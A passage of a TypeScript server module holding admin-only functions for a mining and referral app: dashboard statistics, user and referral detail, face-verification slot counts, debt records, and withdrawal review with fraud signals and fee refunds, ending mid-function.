import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { REFERRAL_UNLOCK_THRESHOLD, REVERIFY_INTERVAL_MS } from "@/lib/constants";
import { resetEmailOtpCache } from "@/lib/auth-mode.server";

async function gate() {
  const { requireAdminSession } = await import("@/lib/admin-session.server");
  await requireAdminSession();
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  return supabaseAdmin;
}

// ---------------- Stats ----------------
export const adminStats = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const startOfToday = new Date();
  startOfToday.setHours(0, 0, 0, 0);
  const todayIso = startOfToday.toISOString();

  const [
    usersC, walletsC, unverifiedC, todayVerifiedC, todayDoneC, activeMiningC, kycC, rechargesC,
    doneC, verifiedC, emptyC,
    pendingC, paidC, rejectedC,
    todayFirstC, todayReverifyC,
  ] = await Promise.all([
    supabaseAdmin.from("profiles").select("id", { count: "exact", head: true }),
    supabaseAdmin.from("wallets").select("user_id", { count: "exact", head: true }),
    supabaseAdmin.from("unverified_attempts").select("id", { count: "exact", head: true }),
    supabaseAdmin.from("tasks").select("id", { count: "exact", head: true }).gte("initial_verify_at", todayIso),
    supabaseAdmin.from("tasks").select("id", { count: "exact", head: true }).gte("done_at", todayIso),
    supabaseAdmin.from("mining_state").select("user_id", { count: "exact", head: true }).eq("is_active", true),
    supabaseAdmin.from("profiles").select("id", { count: "exact", head: true }).eq("kyc_verified", true),
    supabaseAdmin.from("recharges").select("id", { count: "exact", head: true }),
    supabaseAdmin.from("tasks").select("id", { count: "exact", head: true }).eq("status", "done"),
    supabaseAdmin.from("tasks").select("id", { count: "exact", head: true }).eq("status", "verified"),
    supabaseAdmin.from("tasks").select("id", { count: "exact", head: true }).eq("status", "empty"),
    supabaseAdmin.from("withdrawals").select("id", { count: "exact", head: true }).eq("status", "pending"),
    supabaseAdmin.from("withdrawals").select("id", { count: "exact", head: true }).eq("status", "paid"),
    supabaseAdmin.from("withdrawals").select("id", { count: "exact", head: true }).eq("status", "rejected"),
    supabaseAdmin.from("tasks").select("id", { count: "exact", head: true }).gte("initial_verify_at", todayIso),
    supabaseAdmin.from("tasks").select("id", { count: "exact", head: true }).gte("last_reverified_at", todayIso),
  ]);

  // Per-day (last 7 days) first-verify + re-verify counts so admin can read
  // the daily rhythm at a glance instead of only "today".
  const days = Array.from({ length: 7 }, (_, i) => {
    const from = new Date(startOfToday);
    from.setDate(from.getDate() - i);
    const to = new Date(from);
    to.setDate(to.getDate() + 1);
    return { from, to };
  });
  const dailyRaw = await Promise.all(
    days.flatMap(({ from, to }) => [
      supabaseAdmin.from("tasks").select("id", { count: "exact", head: true })
        .gte("initial_verify_at", from.toISOString()).lt("initial_verify_at", to.toISOString()),
      supabaseAdmin.from("tasks").select("id", { count: "exact", head: true })
        .gte("last_reverified_at", from.toISOString()).lt("last_reverified_at", to.toISOString()),
    ]),
  );
  const daily = days.map(({ from }, i) => ({
    date: from.toISOString().slice(0, 10),
    firstVerify: dailyRaw[i * 2]?.count ?? 0,
    reverify: dailyRaw[i * 2 + 1]?.count ?? 0,
  }));

  return {
    users: usersC.count ?? 0,
    wallets: walletsC.count ?? 0,
    kycVerified: kycC.count ?? 0,
    recharges: rechargesC.count ?? 0,
    unverifiedCount: unverifiedC.count ?? 0,
    reverifyQueue: verifiedC.count ?? 0,
    todayVerified: (todayVerifiedC.count ?? 0) + (todayDoneC.count ?? 0),
    todayFirstVerify: todayFirstC.count ?? 0,
    todayReverify: todayReverifyC.count ?? 0,
    daily,
    tasks: { done: doneC.count ?? 0, verified: verifiedC.count ?? 0, empty: emptyC.count ?? 0 },
    mining: {
      activeUsers: activeMiningC.count ?? 0,
    },
    withdrawals: {
      pending: pendingC.count ?? 0,
      paid: paidC.count ?? 0,
      rejected: rejectedC.count ?? 0,
    },
  };
});


export const adminMoneyStats = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const sumPaged = async (
    table: string,
    column: string,
    orderColumn = "id",
    filter?: (query: any) => any,
  ) => {
    let total = 0;
    for (let from = 0; ; from += 1000) {
      let query: any = supabaseAdmin.from(table as any).select(column).order(orderColumn).range(from, from + 999);
      if (filter) query = filter(query);
      const { data, error } = await query;
      if (error) throw new Error(`${table}.${column}: ${error.message}`);
      const rows = (data as any[]) ?? [];
      total += rows.reduce((sum, row) => sum + Number(row[column] ?? 0), 0);
      if (rows.length < 1000) break;
    }
    return total;
  };
  const [pendingAmount, paidWithdraw, paidRecharge, adminCredits, totalAccrued] = await Promise.all([
    sumPaged("withdrawals", "amount", "id", (query) => query.eq("status", "pending")),
    sumPaged("withdrawals", "amount", "id", (query) => query.eq("status", "paid")),
    sumPaged("recharges", "amount", "id", (query) => query.eq("status", "success")),
    sumPaged("admin_credits", "amount", "id"),
    sumPaged("mining_state", "accrued_amount", "user_id"),
  ]);
  return {
    pendingAmount,
    totalAccrued,
    totalPaid: paidWithdraw + paidRecharge + Math.max(0, adminCredits),
  };
});




// ---------------- Users ----------------
export const adminListUsers = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const fetchAll = async (table: "tasks" | "unverified_attempts", select: string) => {
    const rows: any[] = [];
    for (let from = 0; ; from += 1000) {
      const { data, error } = await supabaseAdmin.from(table).select(select).order("id").range(from, from + 999);
      if (error) throw new Error(error.message);
      rows.push(...(data ?? []));
      if (!data || data.length < 1000) break;
    }
    return rows;
  };
  const fetchAllProfiles = async () => {
    const rows: any[] = [];
    for (let from = 0; ; from += 1000) {
      const { data, error } = await supabaseAdmin.from("profiles").select("*").order("created_at", { ascending: false }).order("id").range(from, from + 999);
      if (error) throw new Error(error.message);
      rows.push(...(data ?? []));
      if (!data || data.length < 1000) break;
    }
    return rows;
  };
  const fetchAllMining = async () => {
    const rows: any[] = [];
    for (let from = 0; ; from += 1000) {
      const { data, error } = await supabaseAdmin.from("mining_state").select("*").order("user_id").range(from, from + 999);
      if (error) throw new Error(error.message);
      rows.push(...(data ?? []));
      if (!data || data.length < 1000) break;
    }
    return rows;
  };
  const fetchAllWallets = async () => {
    const rows: any[] = [];
    for (let from = 0; ; from += 1000) {
      const { data, error } = await supabaseAdmin.from("wallets").select("*").order("user_id").order("provider").range(from, from + 999);
      if (error) throw new Error(error.message);
      rows.push(...(data ?? []));
      if (!data || data.length < 1000) break;
    }
    return rows;
  };
  const [profiles, tasks, attempts, minings, wallets] = await Promise.all([
    fetchAllProfiles(),
    fetchAll("tasks", "id, user_id, slot, status, whitelist_ok, wallet_address, face_photo_url, initial_verify_at, reverify_count"),
    fetchAll("unverified_attempts", "id, user_id, wallet_address, face_photo_url"),
    fetchAllMining(),
    fetchAllWallets(),
  ]);

  const faceKeysByUser = new Map<string, Set<string>>();
  const slotFacesByUser = new Map<string, number>();
  const attemptFacesByUser = new Map<string, number>();

  const addFace = (userId: string, key: string) => {
    const set = faceKeysByUser.get(userId) ?? new Set<string>();
    set.add(key);
    faceKeysByUser.set(userId, set);
  };

  for (const t of tasks ?? []) {
    const hasGoodDollarFace = t.status === "verified" || t.status === "done" || !!t.face_photo_url || !!t.wallet_address;
    if (!hasGoodDollarFace) continue;
    addFace(t.user_id, t.wallet_address ? `wallet:${t.wallet_address}` : `task:${t.id}`);
    slotFacesByUser.set(t.user_id, (slotFacesByUser.get(t.user_id) ?? 0) + 1);
  }

  for (const a of attempts ?? []) {
    if (!a.face_photo_url && !a.wallet_address) continue;
    addFace(a.user_id, a.wallet_address ? `wallet:${a.wallet_address}` : `attempt:${a.id}`);
    attemptFacesByUser.set(a.user_id, (attemptFacesByUser.get(a.user_id) ?? 0) + 1);
  }

  const firstVerifySlotsByUser = new Map<string, Set<number>>();
  for (const t of tasks ?? []) {
    if (t.initial_verify_at) {
      const slots = firstVerifySlotsByUser.get(t.user_id) ?? new Set<number>();
      slots.add(Number(t.slot));
      firstVerifySlotsByUser.set(t.user_id, slots);
    }
  }

  const tasksByUser = new Map<string, any[]>();
  for (const t of tasks ?? []) {
    const arr = tasksByUser.get(t.user_id) ?? [];
    arr.push(t);
    tasksByUser.set(t.user_id, arr);
  }
  const miningByUser = new Map<string, any>();
  for (const m of minings ?? []) miningByUser.set(m.user_id, m);
  const walletsByUser = new Map<string, any[]>();
  for (const w of wallets ?? []) {
    const arr = walletsByUser.get(w.user_id) ?? [];
    arr.push(w);
    walletsByUser.set(w.user_id, arr);
  }

  return (profiles ?? []).map((p) => {
    const userTasks = tasksByUser.get(p.id) ?? [];
    const done = userTasks.filter((t: any) => Number(t.reverify_count ?? 0) > 0).length;
    const verified = userTasks.filter((t) => t.status === "verified").length;
    const m = miningByUser.get(p.id);
    const userWallets = walletsByUser.get(p.id) ?? [];
    const w = userWallets.find((x) => x.provider === "bkash") ?? userWallets[0] ?? null;
    const faceTotal = firstVerifySlotsByUser.get(p.id)?.size ?? 0;
    const slotFaces = slotFacesByUser.get(p.id) ?? 0;
    const attemptFaces = attemptFacesByUser.get(p.id) ?? 0;
    const firstVerifies = faceTotal;
    const referralUnlocked = (p as any).referral_unlock_override === true
      || firstVerifies >= REFERRAL_UNLOCK_THRESHOLD;
    return {
      profile: p, done, verified, faceTotal, slotFaces, attemptFaces,
      firstVerifies, reverifies: done,
      serial: Number((p as any).uid_seq ?? 0),
      referralUnlocked, referralOverride: (p as any).referral_unlock_override === true,
      emptySlots: Math.max(0, 10 - slotFaces), mining: m, wallet: w, wallets: userWallets,
    };
  });

});


export const adminUserDetail = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ userId: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const [profile, tasks, mining, wallets, withdrawals, unverified, referrals, debts, vouchersAll, creditsAll, rechargesAll, transfersIn, transfersOut, miningClaimsAll, authUserRes] = await Promise.all([
      supabaseAdmin.from("profiles").select("*").eq("id", data.userId).maybeSingle(),
      supabaseAdmin.from("tasks").select("*").eq("user_id", data.userId).order("slot"),
      supabaseAdmin.from("mining_state").select("*").eq("user_id", data.userId).maybeSingle(),
      supabaseAdmin.from("wallets").select("*").eq("user_id", data.userId).order("provider"),
      supabaseAdmin.from("withdrawals").select("*").eq("user_id", data.userId).order("created_at", { ascending: false }),
      supabaseAdmin.from("unverified_attempts").select("*").eq("user_id", data.userId).order("created_at", { ascending: false }),
      supabaseAdmin.from("profiles").select("id, display_name, phone_number, email, created_at").eq("referred_by", data.userId).order("created_at", { ascending: false }),
      supabaseAdmin.from("user_debts").select("*").eq("user_id", data.userId).order("created_at", { ascending: false }),
      supabaseAdmin.from("bonus_vouchers").select("id, amount, reason, status, created_at, claimed_at").eq("user_id", data.userId).order("created_at", { ascending: false }),
      supabaseAdmin.from("admin_credits").select("id, amount, note, created_at").eq("user_id", data.userId).order("created_at", { ascending: false }),
      supabaseAdmin.from("recharges").select("id, amount, mobile, operator, status, created_at").eq("user_id", data.userId).order("created_at", { ascending: false }),
      supabaseAdmin.from("transfers").select("id, amount, fee_amount, note, sender_id, created_at, sender:profiles!transfers_sender_id_fkey(id, uid_seq, display_name, phone_number)").eq("receiver_id", data.userId).order("created_at", { ascending: false }),
      supabaseAdmin.from("transfers").select("id, amount, fee_amount, note, receiver_id, created_at, receiver:profiles!transfers_receiver_id_fkey(id, uid_seq, display_name, phone_number, balance_frozen)").eq("sender_id", data.userId).order("created_at", { ascending: false }),
      supabaseAdmin.from("mining_claims").select("id, amount, self_amount, referral_amount, balance_after, kind, note, created_at").eq("user_id", data.userId).order("created_at", { ascending: false }).limit(200),
      supabaseAdmin.auth.admin.getUserById(data.userId).catch(() => null),
    ]);


    // Sign task face-photo URLs in parallel with fault-tolerance — sequential awaits
    // and a single failing signed URL were the primary reason the detail page hung.
    const taskRows = await Promise.all((tasks.data ?? []).map(async (t) => {
      if (!t.face_photo_url) return { ...t, signed_url: null };
      try {
        const { data: s } = await supabaseAdmin.storage.from("face-photos").createSignedUrl(t.face_photo_url, 60 * 30);
        return { ...t, signed_url: s?.signedUrl ?? null };
      } catch {
        return { ...t, signed_url: null };
      }
    }));

    const referrerId = profile.data?.referred_by ?? null;
    const referrer = referrerId
      ? await supabaseAdmin
          .from("profiles")
          .select("id, uid_seq, display_name, phone_number, email, referral_code, created_at")
          .eq("id", referrerId)
          .maybeSingle()
      : null;

    const myFaceKeys = new Set<string>();
    for (const t of taskRows) {
      const hasGoodDollarFace = t.status === "verified" || t.status === "done" || !!t.face_photo_url || !!t.wallet_address;
      if (hasGoodDollarFace) myFaceKeys.add(t.wallet_address ? `wallet:${t.wallet_address}` : `task:${t.id}`);
    }
    for (const a of unverified.data ?? []) {
      if (a.face_photo_url || a.wallet_address) myFaceKeys.add(a.wallet_address ? `wallet:${a.wallet_address}` : `attempt:${a.id}`);
    }

    const referralIds = (referrals.data ?? []).map((r) => r.id);
    let referralRows: any[] = [];
    if (referralIds.length > 0) {
      const CHUNK = 150;
      const chunks: string[][] = [];
      for (let i = 0; i < referralIds.length; i += CHUNK) chunks.push(referralIds.slice(i, i + CHUNK));
      const fetchReferralRows = async (table: "tasks" | "unverified_attempts", select: string) => {
        const fetchChunk = async (chunk: string[]) => {
          const rows: any[] = [];
          for (let from = 0; ; from += 1000) {
            const { data, error } = await supabaseAdmin.from(table).select(select).in("user_id", chunk).order("id").range(from, from + 999);
            if (error) throw new Error(error.message);
            rows.push(...(data ?? []));
            if (!data || data.length < 1000) break;
          }
          return rows;
        };
        // Parallelize chunk fetches — sequential loops were timing out for heavy referrers.
        const results = await Promise.all(chunks.map(fetchChunk));
        return results.flat();
      };
       const refTasks = await fetchReferralRows("tasks", "id, user_id, slot, status, wallet_address, initial_verify_at, reverify_count");

       const refFirstVerifySlots = new Map<string, Set<number>>();
      const refReverifySlots = new Map<string, Set<number>>();
      for (const t of refTasks ?? []) {
         if (t.initial_verify_at) {
           const slots = refFirstVerifySlots.get(t.user_id) ?? new Set<number>();
           slots.add(Number(t.slot));
           refFirstVerifySlots.set(t.user_id, slots);
        }
        if (Number(t.reverify_count ?? 0) > 0) {
          const slots = refReverifySlots.get(t.user_id) ?? new Set<number>();
          slots.add(Number(t.slot));
          refReverifySlots.set(t.user_id, slots);
        }
      }
      referralRows = (referrals.data ?? []).map((r) => ({
        ...r,
         faceTotal: refFirstVerifySlots.get(r.id)?.size ?? 0,
         firstVerifies: refFirstVerifySlots.get(r.id)?.size ?? 0,
        reverifies: refReverifySlots.get(r.id)?.size ?? 0,
      })).sort((a, b) => b.faceTotal - a.faceTotal || new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
    }

    return {
      profile: profile.data,
      referrer: referrer?.data ?? null,
      blocked: (() => {
        if ((profile.data as any)?.banned === true) return true;
        const bu = (authUserRes as any)?.data?.user?.banned_until as string | null | undefined;
        if (!bu) return false;
        return new Date(bu).getTime() > Date.now();
      })(),
      tasks: taskRows,
      mining: mining.data,
      wallet: (wallets.data ?? []).find((w) => w.provider === "bkash") ?? wallets.data?.[0] ?? null,
      wallets: wallets.data ?? [],
      withdrawals: withdrawals.data ?? [],
      unverified: unverified.data ?? [],
      faceSummary: {
        total: myFaceKeys.size,
        slotFaces: taskRows.filter((t) => t.status === "verified" || t.status === "done" || !!t.face_photo_url || !!t.wallet_address).length,
        backupFaces: (unverified.data ?? []).filter((a) => a.face_photo_url || a.wallet_address).length,
        done: taskRows.filter((t) => t.status === "done").length,
        verified: taskRows.filter((t) => t.status === "verified").length,
        firstVerifies: new Set(taskRows.filter((t) => !!t.initial_verify_at).map((t) => Number(t.slot))).size,
        reverifies: taskRows.filter((t: any) => Number(t.reverify_count ?? 0) > 0).length,
        emptySlots: taskRows.filter((t) => t.status === "empty" && !t.face_photo_url && !t.wallet_address).length,
      },
      referrals: referralRows,
      referralSummary: {
        totalAccounts: referrals.data?.length ?? 0,
        activeAccounts: referralRows.filter((r) => r.faceTotal > 0).length,
        totalFaces: referralRows.reduce((sum, r) => sum + r.faceTotal, 0),
      },
      referralLock: {
        override: (profile.data as any)?.referral_unlock_override === true,
        firstVerifies: new Set(taskRows.filter((t) => !!t.initial_verify_at).map((t) => Number(t.slot))).size,
        unlocked: (profile.data as any)?.referral_unlock_override === true
          || new Set(taskRows.filter((t) => !!t.initial_verify_at).map((t) => Number(t.slot))).size >= REFERRAL_UNLOCK_THRESHOLD,
      },
      debts: debts.data ?? [],
      debtTotal: (debts.data ?? []).filter((d: any) => d.status === "active").reduce((s: number, d: any) => s + Number(d.amount), 0),
      recharges: rechargesAll.data ?? [],
      transfersIn: transfersIn.data ?? [],
      transfersOut: transfersOut.data ?? [],
      breakdown: await (async () => {
        const { buildEarningsBreakdown } = await import("@/lib/earnings-breakdown.server");
        return buildEarningsBreakdown(supabaseAdmin, data.userId);
      })(),
      // কে কোন রেটে রেফার বোনাস দিয়েছে + কোন রেফার এখনো বাকি (নাম ধরে হিসাব)
      referralHistory: await (async () => {
        const { buildReferralHistory } = await import("@/lib/referral-history.server");
        try {
          return await buildReferralHistory(supabaseAdmin, data.userId);
        } catch {
          return null;
        }
      })(),
      // not-whitelist হওয়ার পর কতবার আবার re-verify হয়েছে
      reverifyStats: await (async () => {
        const { buildReverifyStats } = await import("@/lib/referral-history.server");
        return buildReverifyStats(taskRows);
      })(),

      income: {
        vouchers: vouchersAll.data ?? [],
        adminCredits: creditsAll.data ?? [],
        recharges: rechargesAll.data ?? [],
        transfersIn: transfersIn.data ?? [],
        transfersOut: transfersOut.data ?? [],
        miningClaims: miningClaimsAll.data ?? [],
        totals: {
          vouchersClaimed: (vouchersAll.data ?? []).filter((v: any) => v.status === "claimed").reduce((s: number, v: any) => s + Number(v.amount), 0),
          adminCreditsPositive: (creditsAll.data ?? []).filter((c: any) => Number(c.amount) > 0).reduce((s: number, c: any) => s + Number(c.amount), 0),
          adminCreditsNegative: (creditsAll.data ?? []).filter((c: any) => Number(c.amount) < 0).reduce((s: number, c: any) => s + Number(c.amount), 0),
          rechargesSuccess: (rechargesAll.data ?? []).filter((r: any) => r.status === "success").reduce((s: number, r: any) => s + Number(r.amount), 0),
          transfersInTotal: (transfersIn.data ?? []).reduce((s: number, t: any) => s + Number(t.amount), 0),
          transfersOutTotal: (transfersOut.data ?? []).reduce((s: number, t: any) => s + Number(t.amount), 0),
          withdrawalsPaid: (withdrawals.data ?? []).filter((w: any) => w.status === "paid").reduce((s: number, w: any) => s + Number(w.amount), 0),
          referralAccrued: Number((mining.data as any)?.referral_accrued ?? 0),
          miningClaimedTotal: (miningClaimsAll.data ?? []).reduce((s: number, c: any) => s + Number(c.amount ?? 0), 0),
        },
      },
    };
  });



export const adminAddDebt = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    userId: z.string().uuid(),
    amount: z.number().positive(),
    provider: z.enum(["bkash", "nagad"]),
    paymentNumber: z.string().min(4),
    message: z.string().max(2000).optional(),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error } = await supabaseAdmin.from("user_debts").insert({
      user_id: data.userId,
      amount: data.amount,
      provider: data.provider,
      payment_number: data.paymentNumber,
      message: data.message ?? null,
    });
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const adminResolveDebt = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ debtId: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error } = await supabaseAdmin.from("user_debts")
      .update({ status: "resolved", resolved_at: new Date().toISOString() })
      .eq("id", data.debtId);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const adminDeleteDebt = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ debtId: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error } = await supabaseAdmin.from("user_debts").delete().eq("id", data.debtId);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

// List debts claimed by users, pending admin approval
export const adminListDebtClaims = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const { data: debts, error } = await supabaseAdmin
    .from("user_debts")
    .select("*")
    .eq("status", "claimed")
    .order("claimed_at", { ascending: false });
  if (error) throw new Error(error.message);
  const userIds = Array.from(new Set((debts ?? []).map((d: any) => d.user_id)));
  if (userIds.length === 0) return [];
  const { data: profiles } = await supabaseAdmin
    .from("profiles")
    .select("id, display_name, phone_number, uid_seq")
    .in("id", userIds);
  const pMap = new Map((profiles ?? []).map((p: any) => [p.id, p]));
  return (debts ?? []).map((d: any) => ({ ...d, profile: pMap.get(d.user_id) ?? null }));
});



// ---------------- Withdrawals ----------------
export const adminListWithdrawals = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  // Load pending in full + latest 500 processed rows; the withdrawals page can page further if needed.
  const [pendingRes, recentRes] = await Promise.all([
    supabaseAdmin
      .from("withdrawals")
      .select("*, profiles:user_id(display_name, email, phone_number, uid_seq, created_at)")
      .eq("status", "pending")
      .order("created_at", { ascending: false }),
    supabaseAdmin
      .from("withdrawals")
      .select("*, profiles:user_id(display_name, email, phone_number, uid_seq, created_at)")
      .neq("status", "pending")
      .order("created_at", { ascending: false })
      .limit(500),
  ]);
  if (pendingRes.error) throw new Error(pendingRes.error.message);
  if (recentRes.error) throw new Error(recentRes.error.message);
  const rows: any[] = [...(pendingRes.data ?? []), ...(recentRes.data ?? [])];

  // Suspicion signals for pending rows only
  const pendingUserIds = Array.from(new Set(rows.filter((r) => r.status === "pending").map((r) => r.user_id)));
  const signalsMap = new Map<string, any>();
  if (pendingUserIds.length > 0) {
    const [tasksRes, miningRes, debtsRes, prevPaidRes, unverifiedRes, refereesRes, settingsRes, creditsRes, transfersInRes, vouchersRes] = await Promise.all([
      supabaseAdmin.from("tasks").select("user_id, status, whitelist_ok, wallet_address, reverify_count, initial_verify_at").in("user_id", pendingUserIds),
      supabaseAdmin.from("mining_state").select("user_id, accrued_amount, withdrawn_amount, bonus_amount, is_active").in("user_id", pendingUserIds),
      supabaseAdmin.from("user_debts").select("user_id, amount, status").in("user_id", pendingUserIds).eq("status", "active"),
      supabaseAdmin.from("withdrawals").select("user_id, amount, status").in("user_id", pendingUserIds).eq("status", "paid"),
      supabaseAdmin.from("unverified_attempts").select("user_id").in("user_id", pendingUserIds),
      supabaseAdmin.from("profiles").select("id, uid_seq, display_name, phone_number, referred_by, bonus_first_verify_claimed, referrer_bonus_paid_at").in("referred_by", pendingUserIds),
      supabaseAdmin.from("bonus_settings").select("referrer_bonus, promo_active, promo_start_at, promo_end_at, promo_referrer_bonus").eq("id", "default").maybeSingle(),
      supabaseAdmin.from("admin_credits").select("user_id, amount").in("user_id", pendingUserIds),
      supabaseAdmin.from("transfers").select("receiver_id, amount").in("receiver_id", pendingUserIds),
      supabaseAdmin.from("bonus_vouchers").select("user_id, amount, status").in("user_id", pendingUserIds).eq("status", "claimed"),
    ]);

    // Compute qualifying first-verify counts for every referee
    const refereeIds = (refereesRes.data ?? []).map((r: any) => r.id);
    let refereeTaskRows: any[] = [];
    if (refereeIds.length > 0) {
      const { data: rt } = await supabaseAdmin
        .from("tasks")
        .select("user_id, status, whitelist_ok, wallet_address")
        .in("user_id", refereeIds);
      refereeTaskRows = rt ?? [];
    }
    const doneByReferee = new Map<string, number>();
    for (const t of refereeTaskRows) {
      if ((t.status === "done" || t.status === "verified") && t.whitelist_ok && t.wallet_address) {
        doneByReferee.set(t.user_id, (doneByReferee.get(t.user_id) ?? 0) + 1);
      }
    }
    const bs: any = settingsRes.data ?? {};
    const nowMs = Date.now();
    const inPromo = !!bs.promo_active && bs.promo_start_at && bs.promo_end_at
      && nowMs >= new Date(bs.promo_start_at).getTime()
      && nowMs <= new Date(bs.promo_end_at).getTime();
    const refBase = Number(bs.referrer_bonus ?? 100);
    const refPromo = bs.promo_referrer_bonus != null ? Number(bs.promo_referrer_bonus) : refBase;

    for (const uid of pendingUserIds) {
      const uTasks = (tasksRes.data ?? []).filter((t: any) => t.user_id === uid);
      // "verified" for fraud checks = first verify completed (slot has a wallet and
      // was verified once). Losing whitelist later is normal — that's exactly when
      // re-verify is asked for — so it must not make a legit user look fake.
      const verified = uTasks.filter((t: any) => t.wallet_address && (t.initial_verify_at || t.status === "done" || t.status === "verified")).length;
      const notWhitelisted = uTasks.filter((t: any) => t.wallet_address && !t.whitelist_ok).length;
      const totalReverify = uTasks.reduce((a: number, t: any) => a + (t.reverify_count ?? 0), 0);
      const m = (miningRes.data ?? []).find((x: any) => x.user_id === uid);
      const accrued = m ? Number(m.accrued_amount ?? 0) : 0;
      const withdrawn = m ? Number(m.withdrawn_amount ?? 0) : 0;
      const bonusAmount = m ? Number((m as any).bonus_amount ?? 0) : 0;
      const miningAccrued = Math.max(0, accrued - bonusAmount);
      const bal = accrued - withdrawn;
      const debt = (debtsRes.data ?? []).filter((d: any) => d.user_id === uid).reduce((a: number, d: any) => a + Number(d.amount), 0);
      const prevPaidCount = (prevPaidRes.data ?? []).filter((w: any) => w.user_id === uid).length;
      const prevPaidSum = (prevPaidRes.data ?? []).filter((w: any) => w.user_id === uid).reduce((a: number, w: any) => a + Number(w.amount), 0);
      const failedAttempts = (unverifiedRes.data ?? []).filter((u: any) => u.user_id === uid).length;
      const adminCreditsTotal = (creditsRes.data ?? []).filter((c: any) => c.user_id === uid).reduce((a: number, c: any) => a + Number(c.amount), 0);
      const transfersInTotal = (transfersInRes.data ?? []).filter((t: any) => t.receiver_id === uid).reduce((a: number, t: any) => a + Number(t.amount), 0);
      const vouchersTotal = (vouchersRes.data ?? []).filter((v: any) => v.user_id === uid).reduce((a: number, v: any) => a + Number(v.amount), 0);

      const myReferees = (refereesRes.data ?? []).filter((r: any) => r.referred_by === uid);
      const referralBonuses = myReferees.map((r: any) => {
        const first = doneByReferee.get(r.id) ?? 0;
        const paidBonus = !!r.referrer_bonus_paid_at;
        const phone: string = r.phone_number ?? "";
        const masked = phone.length >= 11 ? `${phone.slice(0, 3)}****${phone.slice(-3)}` : phone;
        return {
          id: r.id,
          uid: r.uid_seq ?? null,
          name: r.display_name ?? "User",
          phone: masked,
          firstVerifies: first,
          qualified: first >= 10,
          bonusPaid: paidBonus,
          bonusAmount: paidBonus ? (inPromo ? refPromo : refBase) : 0,
        };
      }).sort((a: any, b: any) => Number(b.bonusPaid) - Number(a.bonusPaid) || b.firstVerifies - a.firstVerifies);
      const referralBonusTotal = referralBonuses.reduce((s: number, r: any) => s + r.bonusAmount, 0);
      const referralPaidCount = referralBonuses.filter((r: any) => r.bonusPaid).length;
      // Legitimate income sources (excluding transfers-out and mining net = accrued - bonus_amount)
      const legitIncomeTotal = accrued + adminCreditsTotal + transfersInTotal;

      signalsMap.set(uid, {
        verifiedTasks: verified,
        notWhitelistedTasks: notWhitelisted,
        reverifyCount: totalReverify,
        balance: bal,
        accrued,
        withdrawn,
        activeDebt: debt,
        miningActive: !!m?.is_active,
        prevPaidCount,
        prevPaidSum,
        failedAttempts,
        referralBonuses,
        referralBonusTotal,
        referralPaidCount,
        // Balance source breakdown — shows admin exactly where the money came from.
        incomeBreakdown: {
          miningAccrued,
          bonusTotal: bonusAmount,
          referralBonusTotal,
          vouchersTotal,
          adminCreditsTotal,
          transfersInTotal,
          legitIncomeTotal,
        },
      });
    }
  }

  return rows.map((r) => ({
    ...r,
    isAdminPayout: typeof r.admin_note === "string" && r.admin_note.startsWith("[Admin Payout]"),
    signals: r.status === "pending" ? signalsMap.get(r.user_id) ?? null : null,
  }));
});


const ActionInput = z.object({
  id: z.string().uuid(),
  action: z.enum(["paid", "rejected"]),
  note: z.string().optional(),
  paidBy: z.string().trim().max(80).optional().nullable(),
  // Reject only: also give the platform fee back to the user.
  refundFee: z.boolean().optional(),
  // Reject only: reason shown to the user + optional screenshot (data URL).
  rejectReason: z.string().trim().max(1000).optional().nullable(),
  proofDataUrl: z.string().max(8_000_000).optional().nullable(),
});

function dataUrlToBytes(dataUrl: string): { bytes: Uint8Array; contentType: string; ext: string } {
  const m = /^data:([^;,]+);base64,(.+)$/s.exec(dataUrl.trim());
  if (!m) throw new Error("Screenshot format ঠিক নেই");
  const contentType = m[1];
  if (!contentType.startsWith("image/")) throw new Error("শুধু ছবি আপলোড করা যাবে");
  const bin = atob(m[2]);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  const ext = contentType === "image/png" ? "png" : contentType === "image/webp" ? "webp" : "jpg";
  return { bytes, contentType, ext };
}

export const adminUpdateWithdrawal = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => ActionInput.parse(input))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { data: w } = await supabaseAdmin.from("withdrawals").select("*").eq("id", data.id).maybeSingle();
    if (!w) throw new Error("Withdrawal na");
    if (w.status !== "pending") throw new Error("Already processed");

    if (data.action === "paid" && !(data.paidBy && data.paidBy.trim())) {
      throw new Error("Admin name দিন — কে paid করছে সেটা লিখতে হবে");
    }

    // Requested gross (before fee) is stored in the note as "Gross X৳"; the row
    // amount is the net payout. Fall back to inverting the fee tiers.
    const payout = Number(w.amount);
    const grossFromNote = /Gross\s+([\d.]+)/.exec(String(w.admin_note ?? ""))?.[1];
    const gross = grossFromNote
      ? Number(grossFromNote)
      : Math.round(payout / (payout < 90 ? 0.8 : 0.9));
    const fee = Math.max(0, gross - payout);
    const refundFee = data.action === "rejected" && data.refundFee === true;
    const refund = refundFee ? payout + fee : payout;

    const reason = (data.rejectReason ?? "").trim();
    let note = data.note ?? null;
    if (data.action === "rejected") {
      const feeLine = refundFee ? `ফি ${fee}৳ ফেরত দেওয়া হয়েছে` : `ফি ${fee}৳ ফেরত হয়নি`;
